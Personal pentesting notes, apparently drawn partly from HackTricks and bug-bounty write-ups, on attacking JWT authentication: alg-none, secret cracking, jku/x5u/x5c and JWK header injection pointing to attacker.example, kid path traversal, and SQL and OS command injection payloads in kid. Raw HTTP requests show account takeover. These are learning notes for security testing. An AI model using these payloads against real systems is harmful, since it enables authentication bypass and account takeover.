> Download JWT Editor extension on burp

https://www.jwt.io/
http://ahttps/gchq.github.io/CyberChef/
https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts
https://www.youtube.com/watch?v=SuDN35-aefY

use this command `waybackurls hacktoberfest.digitalocean.com`

is a format for transmitting cryptographically secure data. While These tokens, encoded as JSON objects, are a secure and efficient way to transmit information between a client and a server.
JWTs consist of three main parts:
- header
- payload
- signature
**Key point**: A JWT **is not always signed or encrypted**. It can be:
- A **JWS** (signed JWT)
- A **JWE** (encrypted JWT)

**JWS (JSON Web Signature)** : A JWT that is **digitally signed** (or MAC-protected). Ensures **integrity** (token wasn’t tampered with) and **authenticity** (came from the issuer).  >> Most common than JWE
- **Structure**: `Base64(Header).Base64(Payload).Base64(Signature)`

**JWE (JSON Web Encryption)** : A JWT that is **encrypted**. Ensures **confidentiality** (nobody but the intended recipient can read it). f the token itself contains sensitive information (like PII), it may be sent as a JWE
- **Structure**: 5 parts instead of 3 → `Header.EncryptedKey.IV.Ciphertext.AuthTag`

**JWA (JSON Web Algorithms)** : The specification that defines the **set of algorithms** used for JWS, JWE, and JWT. 
- For JWS: `HS256`, `RS256`, `ES256`
- For JWE: `RSA-OAEP`, `A128GCM`

**JWK (JSON Web Key)** : A JSON-based data structure that represents a **cryptographic key** (public or private).
```JSON
{
  "kty": "RSA",
  "n": "0vx7agoebGcQSuuPiLJXZptN...",
  "e": "AQAB",
  "alg": "RS256",
  "use": "sig"
}
```

**JKU (JWK Set URL)** : `jku` is a registered **JOSE header parameter** used inside a **JWT/JWS/JWE header**. it points to a URL where the sender’s **public keys** (in a **JWKS: JSON Web Key Set**) can be found. This allows the receiver to fetch the keys and verify the JWT’s signature.
A JWT header might look like this:
``` json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://example.com/.well-known/jwks.json",
  "kid": "abc123"
}
```
And at `https://example.com/.well-known/jwks.json`, you’d find something like:
``` json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "abc123",
      "use": "sig",
      "n": "0vx7agoebGcQSuuPiLJXZptN...",
      "e": "AQAB"
    }
  ]
}
```

---
- **JWT**: The overall token format.
- **JWS**: A **signed** JWT (integrity & authenticity).
- **JWE**: An **encrypted** JWT (confidentiality).
- **JWK**: JSON representation of the **keys** used for signing/encryption.
- **JWA**: Defines the **algorithms** used in JWS/JWE/JWT.
- **JKU**: Used to tell where the public keys are hosted.
---
JWT
▪ JWT token is as :
```JSON
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJIVEItQWNhZGVteSIs
InVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9.Chnhj-
ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA
```
 Every part separated with (.) as
▪ **The header** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9)
▪ **The body** `eyJpc3MiOiJIVEItQWNhZGVteSIsInVzZXIiOiJhZG1pbiIsImlzQWRtaW4iOnRydWV9`
▪ **The signature** `Chnhj-ATkcOfjtn8GCHYvpNE-9dmlhKTCUwl6pxTZEA

![[Pasted image 20250922210230.png]]

---
JWT is encoded by base64 but after decoding it would be as:
The head :
``` json
{
"alg": "HS256",
"typ": "JWT"
}
```
The Body :
```  json
{"iss": "HTB-Academy",
"user": "admin",
"isAdmin": true
}
```
The last part of the JWT is its signature, which is computed based on the JWT's header, payload, and a secret signing key, using the algorithm specified in the header. Therefore, the integrity of the JWT token is protected by the signature.
If any data within the header, payload, or signature itself is manipulated, the signature will no longer match the token, thus enabling the detection of manipulation.
Thus, knowledge of the secret signing key is required to compute a valid signature for a JWT.

---
- try edit the payload and keep the signature the same
- **none technique** : remove the signature and edit the `alg` to none, Even though the JWT does not contain a signature, the final period (.) still needs to be present.
``` json
{
"alg": "none",
"typ": "JWT"
}
```
- try take another valid signature
- **brute force** : JWT supports three *symmetric* algorithms based on potentially guessable secrets: HS256, HS384, and HS512. We need to brute force the secret Signature and we will use hashcat with the mode 16500 > `-m 16500 --show` or use john the ripper.
  Now we can use the signature to forge the JWT by using jwt.io or in burp suite add-on
- **JWK header injection**: using JWT Editor, instead of singing the JWT with the new key, press attack + embed JWK 
- **JKU header injection**: in a hosted server put the key(copy as JWK) that you have generated using the JWT Editor in this format:
  ``` json
   {
  "keys": [
    {
      "kty": "RSA",
      "kid": "abc123",
      "use": "sig",
      "n": "0vx7agoebGcQSuuPiLJXZptN...",
      "e": "AQAB"
    }
  ]
  }
    ```
  and then add a JKU header in JWT points to it and then sign the JWT with the new key and replace the KID header with the new one then send the request 
- **KID header path traversal** : when generating a key replace `k` parameter with `AA==` (base64 of null byte) and then in the JWT replace the KID with `../../../dev/null` (keep trying cuz u don't know where u r in the system) and then sign and send
- **KEY CONFUSION ATTACK** : if the `alg` is RSA try change it to `hmac` and generate a key
- It's important to determine whether the token was generated server-side or client-side by examining the proxy's request history. Tokens first seen from the client side suggest the key might be exposed to client-side code, necessitating further investigation.
- Check if the token lasts more than 24h... maybe it never expires. If there is a "exp" filed, check if the server is correctly handling it.

---
**note** : when generating a new key be careful is it a RSA key or a symmetric key

---
### [**Quick Wins**](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#quick-wins)

Run [**jwt_tool**](https://github.com/ticarpi/jwt_tool) with mode `All Tests!` and wait for green lines

```bash
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

If you are lucky the tool will find some case where the web application is incorrectly checking the JWT:
![[image (935).png]]

Then, you can search the request in your proxy or dump the used JWT for that request using jwt_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```

You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

---
### [Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#change-the-algorithm-rs256asymmetric-to-hs256symmetric-cve-2016-5431cve-2016-10555)

The algorithm HS256 uses the secret key to sign and verify each message.  
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.

If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
---
#### [Revealing Key through "kid"](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#revealing-key-through-kid) >(if u can upload a file check this)

When the `kid` claim is present in the header, it's advised to search the web directory for the corresponding file or its variations. For instance, if `"kid":"key/12345"` is specified, the files _/key/12345_ and _/key/12345.pem_ should be searched for in the web root.

---
#### [SQL Injection via "kid"](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#sql-injection-via-kid)

If the `kid` claim's content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid` payload. An example payload that uses SQL injection to alter the JWT signing process includes:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

This alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.

---
#### [OS Injection through "kid"](https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#os-injection-through-kid)

A scenario where the `kid` parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's possible to expose private keys. An example payload for achieving RCE and key exposure is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

---
# jku — **JWK Set URL**

**What it is**

- `jku` is a JWT header parameter that gives a URL pointing to a **JSON Web Key Set (JWKS)**.
- The JWKS contains public keys (`kty`, `n`, `e`, `kid`, …) that verifiers can use to validate signatures.

**Attack/abuse pattern**

1. Attacker tampers JWT header to set `"jku": "https://attacker.example/jwks.json"` (or to a local path the server fetches).
2. The attacker hosts a JWKS at that URL containing a public key that matches a private key they control.
3. If the server **fetches and trusts** that JWKS blindly, the attacker can sign tokens with their private key and the server will accept them.

**How to test (authorized only) — summary**

- Create a keypair (private + public)
- Host a JWKS with the public key on a domain you control (or on a path the server will request).
- Craft a JWT header with `"jku": "<your URL>"` and `"kid"` set appropriately, sign with your private key.
- Observe whether the server fetched your URL / accepted your token.

# x5u — **X.509 URL**

**What it is**

- `x5u` is a JWT header parameter containing a URL that points to one or more **X.509 certificates** (PEM).
- The first cert must be the signing cert; following certs form the chain.

**Attack/abuse pattern**

- Tamper JWT header to set `"x5u": "https://attacker.example/attacker.crt"`.
- Host an X.509 cert (PEM) at that URL with a public key that matches the private key the attacker controls.
- If the server fetches and trusts the cert without verifying issuer/chain, the attacker can sign tokens that validate.

**SSRF angle**

- If the server fetches `x5u` over HTTP(S) and you can control the URL, you may be able to provoke **server-side requests** (SSRF) to internal endpoints or metadata services.

# x5c — **X.509 Certificate Chain (embedded)**

**What it is**

- `x5c` contains an array of base64-encoded X.509 certificates (PEM content without the `-----BEGIN CERT-----` headers).
- The first certificate is the signing cert.

**Attack/abuse pattern**

- Attacker embeds their own self-signed certificate in `x5c[]`, signs the JWT with the corresponding private key, and if the verifier accepts embedded certs without validating trust chain or issuer, the token will be accepted.

``` bash
# Generate RSA private key (PEM)
openssl genrsa -out keypair.pem 2048

# Extract public key (PEM)
openssl rsa -in keypair.pem -pubout -out publickey.crt

# Convert private key to PKCS#8 (unencrypted)
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt \
  -in keypair.pem -out pkcs8.key

# Create self-signed x509 cert & private key (for x5u/x5c testing)
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout attacker.key -out attacker.crt
# extract PEM public key
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem

```

### Extract `n` and `e` (RSA parameters) from a public key (example Python)
_(Useful to create a JWK entry with `n` and `e` values — convert to base64url as required)_
``` bash
from Crypto.PublicKey import RSA

with open("publickey.crt", "r") as fp:
    key = RSA.importKey(fp.read())

print("n (hex):", hex(key.n))
print("e (hex):", hex(key.e))

# Note: To make a JWK, you should base64url-encode the big-endian byte sequences of n and e.
```

``` bash
// jku pointing to attacker-controlled JWKS
{
  "alg": "RS256",
  "kid": "attacker-1",
  "jku": "https://attacker.example/.well-known/jwks.json"
}

// x5u pointing to certificate under attacker control
{
  "alg": "RS256",
  "x5u": "https://attacker.example/attacker.crt"
}

// x5c embedding the attacker's certificate (base64-encoded DER)
{
  "alg": "RS256",
  "x5c": ["<base64(cert)>"]
}
```

# Embedded Public Key (CVE-2018-0114)
## How the attack works (conceptual)

1. Server receives a JWT with a header that contains public key components (e.g. a JWK or `n`/`e` for RSA).
2. The verifier reads those components and constructs a public key object.
3. The verifier uses that public key to check the signature.
4. If the attacker included their own public key and signed with the matching private key, verification succeeds.

Common header fields that can be abused: `jwk`, `n`/`e` in custom headers, `x5c` (if the server accepts untrusted certs), or any header-specified key material.

### Generate RSA keypair (OpenSSL)
``` bash
# Generate private key
openssl genrsa -out keypair.pem 2048

# Extract public key (PEM)
openssl rsa -in keypair.pem -pubout -out publickey.crt

# Convert private key to PKCS#8 (PEM, unencrypted)
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt \
  -in keypair.pem -out pkcs8.key

```
### Extract RSA components (n and e) in Node.js (base64 or hex)
``` bash
// Install: npm i node-rsa
const NodeRSA = require('node-rsa');
const fs = require('fs');

// load private key
const keyPair = fs.readFileSync('keypair.pem');
const key = new NodeRSA(keyPair);

// export public components (Buffer objects)
const publicComponents = key.exportKey('components-public');
// n and e are Buffers (big-endian)
console.log('n (hex):', publicComponents.n.toString('hex'));
console.log('e (hex):', publicComponents.e.toString('hex'));

// For building a JWK you will base64url-encode the big-endian bytes of n and e.

```
### Importing a public key from `n` and `e` (Node example)
``` bash
// Convert base64url n,e -> Buffer and import as public key
// Example uses node-rsa which accepts 'components-public' with Buffer n and e.

const NodeRSA = require('node-rsa');

// Suppose `n_b64url` and `e_b64url` are from a token header
const base64url = (s) => s.replace(/-/g,'+').replace(/_/g,'/'); // simple convert (pad as needed)

const n = Buffer.from(base64url(n_b64url) + '==', 'base64'); // ensure padding
const e = Buffer.from(base64url(e_b64url) + '==', 'base64');

const key = new NodeRSA();
key.importKey({ n: n, e: e }, 'components-public');
console.log(key.exportKey('public')); // show PEM
```
----

![[Pasted image 20250928174453.png]]

----
## Example using subdomains enumeration
So I tried to sign-in in “staging.redacted.com” using the account created in the main App on “[www.redacted.com](http://www.redacted.com)", but with no success. So I created a new one. The JWT token structure is the same but with a different “id” value.
This indicates that both web apps are using different databases to store the data, which is normal since one is used for prod while to other for staging.
What will happen if I tried to login into the main app using the JWT token from the staging app?

And Boom. It worked! This time, I’m logging-in in as the user with account **id=512**, in the main web app on “[www.redacted.com](http://www.redacted.com)".

---
## Expose JWT-generation end-point
basically while logged in with google I intercepted all request one by one

and surprisingly in my burp history I found an api endpoint that that generates jwt token of user via taking email id as parameter see below

```
POST /register?src=aweb HTTP/1.1

Host: userapi.target.com

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: https://www.target.com

cp-origin: 11

Content-Type: application/json

X-Auth-Token: xxxxx

X-JWT-Token:

Origin: https://www.target.com

Content-Length: 1354

Connection: close

{“name”:”Shivam Pandey”,”email”:”shivam@gmail.com”,”providerUserId”:”103151677586368643333",”providerToken”:” eyFuZGV5IiwibG9jYWxlIjoiZW4tR0IiLCJpYXQiOjE1OTQyMjE3NzQsImV4cCI6MTU5NDIyNTM3NCwianRpIjoiODI4MWQwMWNhMTI0NTBkODA0YWQ4YzdkYWEzYTQ5MWI1MTA4M2JlMSJmHBAN06Wv1CspbxbXxxvlCieGHjlXrF5S8TbQvLTwIHKwdlbXhbuYydHpTubRQojAc_ZcHdHlMgumx6XJLvUk10dHkN_V1eQ”,”providerName”:”g”}

```

In above request “provider token” will generate jwt token for given email . so here I changed email with my test account that is testhunter@gmail.com and got his jwt token see response

```
HTTP/1.1 200

Content-Type: application/json;charset=UTF-8

Content-Length: 476

Connection: close

Date: Wed, 08 Jul 2020 15:42:16 GMT

Server: nginx/1.16.1

X-Content-Type-Options: nosniff

X-XSS-Protection: 1; mode=block

Cache-Control: no-cache, no-store, max-age=0, must-revalidate

Pragma: no-cache

Expires: 0

Strict-Transport-Security: max-age=31536000 ; includeSubDomains

X-Frame-Options: DENY

Access-Control-Allow-Origin: https://www.target.com

Vary: Origin

Access-Control-Allow-Credentials: true

X-Application-Context: application:prod

X-Cache: Miss from cloudfront

{“userInfo”:{“id”:8023402,”name”:”Test account Reddy”,”email”:”testhunter@gmail.com”,”status”:2,”phone”:”xxxxxxxxxx",”phoneVerified”:true,”socialUserId”:”8023402",”wasUserExists”: :true,”coins”:1209.00},”jwtToken”:”eyJhbGciOiJIUzUxMiJ9.MjM0MDIiLCJpYXQiOjE1OTQyMjI5MzYsImlzcyI6ImFkZGEyNDcuY29tIiwibmFtZSI6IlNyaWthbnRoIFJlZGR5In0.CNjPEj182YvEsdqMOYE_MauFnkl”}
```
